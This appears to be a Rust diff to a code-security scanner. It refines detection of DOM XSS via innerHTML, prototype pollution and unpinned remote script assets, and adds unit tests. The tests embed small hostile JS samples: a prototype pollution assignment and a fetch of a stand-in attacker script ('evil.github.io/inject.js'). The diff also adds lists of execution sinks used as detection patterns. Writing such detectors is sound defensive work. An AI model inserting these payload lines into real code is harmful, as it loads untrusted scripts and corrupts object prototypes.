@@ -1966,7 +1966,14 @@ fn find_js_slop(eng: &QueryEngine, parsed: &ParsedUnit<'_>) -> Vec<SlopFinding> 
     };
 
     let mut findings = Vec::new();
-    find_inner_html_assignments(tree.root_node(), source, &mut findings);
+    let prototype_pollution_in_context = source_contains_prototype_pollution_pattern(source);
+    find_inner_html_assignments(
+        tree.root_node(),
+        source,
+        &mut findings,
+        &mut Vec::new(),
+        prototype_pollution_in_context,
+    );
     findings
 }
 
@@ -2302,6 +2309,14 @@ fn second_named_child(node: Node<'_>) -> Option<Node<'_>> {
     children.next()
 }
 
+fn third_named_child(node: Node<'_>) -> Option<Node<'_>> {
+    let mut cursor = node.walk();
+    let mut children = node.named_children(&mut cursor);
+    children.next()?;
+    children.next()?;
+    children.next()
+}
+
 fn walk_js_slopsquat_imports(node: Node<'_>, source: &[u8], findings: &mut Vec<SlopFinding>) {
     match node.kind() {
         "import_statement" => {
@@ -2342,12 +2357,36 @@ fn walk_js_slopsquat_imports(node: Node<'_>, source: &[u8], findings: &mut Vec<S
 /// Walk the JS/TS AST looking for `assignment_expression` where the left-hand
 /// side is a `member_expression` whose `property` field is the identifier
 /// `innerHTML`.
-fn find_inner_html_assignments(node: Node<'_>, source: &[u8], findings: &mut Vec<SlopFinding>) {
+fn find_inner_html_assignments(
+    node: Node<'_>,
+    source: &[u8],
+    findings: &mut Vec<SlopFinding>,
+    config_params: &mut Vec<String>,
+    prototype_pollution_in_context: bool,
+) {
+    let original_param_count = config_params.len();
+    collect_config_like_params(node, source, config_params);
+
     if node.kind() == "assignment_expression" {
         if let Some(left) = node.child_by_field_name("left") {
             if left.kind() == "member_expression" {
                 if let Some(prop) = left.child_by_field_name("property") {
                     if prop.utf8_text(source).ok() == Some("innerHTML") {
+                        let rhs = node
+                            .child_by_field_name("right")
+                            .or_else(|| third_named_child(node));
+                        if !prototype_pollution_in_context
+                            && rhs.is_some_and(|right| {
+                                expression_originates_from_config_param(
+                                    right,
+                                    source,
+                                    config_params.as_slice(),
+                                )
+                            })
+                        {
+                            config_params.truncate(original_param_count);
+                            return;
+                        }
                         findings.push(SlopFinding {
                             start_byte: node.start_byte(),
                             end_byte: node.end_byte(),
@@ -2359,6 +2398,7 @@ fn find_inner_html_assignments(node: Node<'_>, source: &[u8], findings: &mut Vec
                             domain: DOMAIN_FIRST_PARTY,
                             severity: Severity::Critical,
                         });
+                        config_params.truncate(original_param_count);
                         return;
                     }
                 }
@@ -2367,8 +2407,67 @@ fn find_inner_html_assignments(node: Node<'_>, source: &[u8], findings: &mut Vec
     }
     let mut cursor = node.walk();
     for child in node.children(&mut cursor) {
-        find_inner_html_assignments(child, source, findings);
+        find_inner_html_assignments(
+            child,
+            source,
+            findings,
+            config_params,
+            prototype_pollution_in_context,
+        );
     }
+    config_params.truncate(original_param_count);
+}
+
+fn collect_config_like_params(node: Node<'_>, source: &[u8], config_params: &mut Vec<String>) {
+    if !matches!(
+        node.kind(),
+        "function_declaration"
+            | "method_definition"
+            | "function_expression"
+            | "arrow_function"
+            | "generator_function_declaration"
+            | "generator_function"
+    ) {
+        return;
+    }
+    let Some(parameters) = node.child_by_field_name("parameters") else {
+        return;
+    };
+    let mut cursor = parameters.walk();
+    for child in parameters.named_children(&mut cursor) {
+        if child.kind() == "identifier" {
+            if let Ok(name) = child.utf8_text(source) {
+                if matches!(name, "options" | "config") {
+                    config_params.push(name.to_owned());
+                }
+            }
+        }
+    }
+}
+
+fn expression_originates_from_config_param(
+    node: Node<'_>,
+    source: &[u8],
+    config_params: &[String],
+) -> bool {
+    if config_params.is_empty() {
+        return false;
+    }
+    let mut stack = vec![node];
+    while let Some(current) = stack.pop() {
+        if current.kind() == "identifier" {
+            if let Ok(name) = current.utf8_text(source) {
+                if config_params.iter().any(|param| param == name) {
+                    return true;
+                }
+            }
+        }
+        let mut cursor = current.walk();
+        for child in current.named_children(&mut cursor) {
+            stack.push(child);
+        }
+    }
+    false
 }
 
 // ---------------------------------------------------------------------------
@@ -2788,10 +2887,7 @@ pub fn find_supply_chain_slop_with_context(
     let ac = supply_chain_automaton();
     let source = parsed.source;
     ac.find_iter(source)
-        .filter(|mat| {
-            let pattern_idx = mat.pattern().as_usize();
-            !(pattern_idx == 0 && should_ignore_supply_chain_http_match(language, parsed, mat))
-        })
+        .filter(|mat| !should_ignore_supply_chain_match(language, parsed, mat))
         .map(|mat| SlopFinding {
             start_byte: mat.start(),
             end_byte: mat.end(),
@@ -2802,7 +2898,7 @@ pub fn find_supply_chain_slop_with_context(
         .collect()
 }
 
-fn should_ignore_supply_chain_http_match(
+fn should_ignore_supply_chain_match(
     language: &str,
     parsed: &ParsedUnit<'_>,
     mat: &aho_corasick::Match,
@@ -2823,8 +2919,11 @@ fn should_ignore_supply_chain_http_match(
     let Some(node) = root.descendant_for_byte_range(mat.start(), end) else {
         return false;
     };
+    let source = parsed.source;
 
     node_or_parent_is_comment(node)
+        || (node_or_parent_is_string_literal(node)
+            && !string_literal_flows_to_asset_execution_sink(node, source))
 }
 
 fn node_or_parent_is_comment(node: Node<'_>) -> bool {
@@ -2836,6 +2935,89 @@ fn node_or_parent_is_comment(node: Node<'_>) -> bool {
         cursor = current.parent();
     }
     false
+}
+
+fn node_or_parent_is_string_literal(node: Node<'_>) -> bool {
+    let mut cursor = Some(node);
+    while let Some(current) = cursor {
+        if matches!(
+            current.kind(),
+            "string"
+                | "string_fragment"
+                | "template_string"
+                | "template_substitution"
+                | "string_literal"
+                | "jsx_text"
+        ) {
+            return true;
+        }
+        cursor = current.parent();
+    }
+    false
+}
+
+fn string_literal_flows_to_asset_execution_sink(node: Node<'_>, source: &[u8]) -> bool {
+    let mut cursor = Some(node);
+    while let Some(current) = cursor {
+        match current.kind() {
+            "call_expression" => {
+                let callee = current
+                    .child_by_field_name("function")
+                    .and_then(|function| function.utf8_text(source).ok())
+                    .unwrap_or("");
+                if matches!(
+                    callee,
+                    "fetch"
+                        | "import"
+                        | "require"
+                        | "axios.get"
+                        | "axios.post"
+                        | "XMLHttpRequest.open"
+                ) {
+                    return true;
+                }
+            }
+            "assignment_expression" => {
+                if let Some(left) = current.child_by_field_name("left") {
+                    if member_property_matches(left, source, &["src", "href"]) {
+                        return true;
+                    }
+                }
+            }
+            "jsx_attribute" => {
+                let name = current
+                    .child_by_field_name("name")
+                    .and_then(|name| name.utf8_text(source).ok())
+                    .unwrap_or("");
+                if matches!(name, "src" | "href") {
+                    return true;
+                }
+            }
+            "pair" => {
+                let key = current
+                    .child_by_field_name("key")
+                    .and_then(|key| key.utf8_text(source).ok())
+                    .unwrap_or("")
+                    .trim_matches(['"', '\'', '`']);
+                if matches!(key, "src" | "href" | "url") {
+                    return true;
+                }
+            }
+            _ => {}
+        }
+        cursor = current.parent();
+    }
+    false
+}
+
+fn member_property_matches(node: Node<'_>, source: &[u8], names: &[&str]) -> bool {
+    let property = node
+        .child_by_field_name("property")
+        .or_else(|| node.child_by_field_name("index"));
+    property
+        .and_then(|property| property.utf8_text(source).ok())
+        .map(|text| text.trim_matches(['"', '\'', '`']))
+        .is_some_and(|text| names.contains(&text))
 }
 
 // ---------------------------------------------------------------------------
@@ -5620,6 +5802,10 @@ fn prototype_automaton() -> &'static AhoCorasick {
     })
 }
 
+fn source_contains_prototype_pollution_pattern(source: &[u8]) -> bool {
+    prototype_automaton().find(source).is_some()
+}
+
 /// Scan JS/TS source bytes for prototype pollution patterns (Layer A).
 ///
 /// Phase 1 AhoCorasick (Tier 2) gate per `docs/R_AND_D_ROADMAP.md` Section III.
@@ -6529,6 +6715,39 @@ pub fn find_outliers(data: &[f64], threshold: f64) -> Vec<f64> {
         );
     }
 
+    #[test]
+    fn test_js_innerhtml_from_options_template_suppressed_without_prototype_pollution() {
+        let src = br#"
+function render(options) {
+    element.innerHTML = options.templates["login"];
+}
+"#;
+        let findings = find_slop("js", src);
+        assert!(
+            findings
+                .iter()
+                .all(|finding| !finding.description.contains("dom_xss_innerHTML")),
+            "developer API templates from options must not fire DOM XSS without prototype pollution context"
+        );
+    }
+
+    #[test]
+    fn test_js_innerhtml_from_options_template_fires_with_prototype_pollution_context() {
+        let src = br#"
+function render(options) {
+    element.innerHTML = options.templates["login"];
+}
+target.__proto__.polluted = true;
+"#;
+        let findings = find_slop("js", src);
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.description.contains("dom_xss_innerHTML")),
+            "prototype pollution in the same scan context must reactivate options-template DOM XSS"
+        );
+    }
+
     // ── HCL / S3 public ACL tests ─────────────────────────────────────────
 
     #[test]
@@ -7019,6 +7238,30 @@ mod credential_tests {
     }
 
     #[test]
+    fn test_github_io_url_inside_inert_js_string_is_ignored() {
+        let src = b"const docs = \"https://some-org.github.io/lib/v2/bundle.js\";\n";
+        let findings = find_slop("js", src);
+        assert!(
+            findings
+                .iter()
+                .all(|f| !f.description.contains("unpinned_asset")),
+            "non-executed string literal URL must not trigger unpinned_asset"
+        );
+    }
+
+    #[test]
+    fn test_github_io_url_inside_fetch_string_is_detected() {
+        let src = b"fetch(\"https://some-org.github.io/lib/v2/bundle.js\");\n";
+        let findings = find_slop("js", src);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.description.contains("unpinned_asset")),
+            "URL string flowing into fetch must remain an unpinned_asset finding"
+        );
+    }
+
+    #[test]
     fn test_github_io_url_detected_by_supply_chain() {
         let src = b"const LIB = \"https://some-org.github.io/lib/v2/bundle.js\";";
         let findings = find_supply_chain_slop(src);
@@ -7046,8 +7289,8 @@ mod credential_tests {
 
     #[test]
     fn test_find_slop_propagates_supply_chain_findings() {
-        // Verify find_slop() surfaces supply-chain findings for any language.
-        let src = b"var cdn = \"https://evil.github.io/inject.js\";";
+        // Verify find_slop() surfaces supply-chain findings from execution sinks.
+        let src = b"fetch(\"https://evil.github.io/inject.js\");";
         let findings = find_slop("js", src);
         assert!(
             findings
